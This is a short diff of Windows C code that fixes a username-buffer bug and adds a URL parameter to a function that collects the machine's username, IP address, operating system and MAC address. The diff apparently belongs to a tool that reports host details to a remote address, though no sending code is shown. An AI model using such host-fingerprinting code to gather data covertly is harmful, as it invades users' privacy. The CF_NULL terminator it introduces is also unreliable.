@@ -134,8 +134,12 @@ void getOperatingSystem(char buffer[BUF_SIZE])
 
 void getUsername(char buffer[BUF_SIZE])
 {
-    char username[BUF_SIZE];
-    GetUserNameA(username, (LPDWORD)BUF_SIZE);
+    DWORD bufSize = BUF_SIZE;
+    char username[bufSize];
+    if (!GetUserNameA(username, &bufSize))
+    {
+        printf("ERROR");
+    }
     snprintf(buffer, BUF_SIZE, "Username: %s", username);
 }
 
@@ -151,10 +155,10 @@ int getTotalSize(char *buffer[], int size)
 
 void truncate(char *buffer, int bufferSize)
 {
-    buffer[bufferSize / 2] = '\0';
+    buffer[bufferSize / 2] = CF_NULL;
 }
 
-void getInformation(char buffer[BUF_SIZE])
+void getInformation(char buffer[BUF_SIZE], char *URL)
 {
     char username[BUF_SIZE], ipAddress[BUF_SIZE], operatingSystem[BUF_SIZE], macAddress[BUF_SIZE];
     getUsername(username);
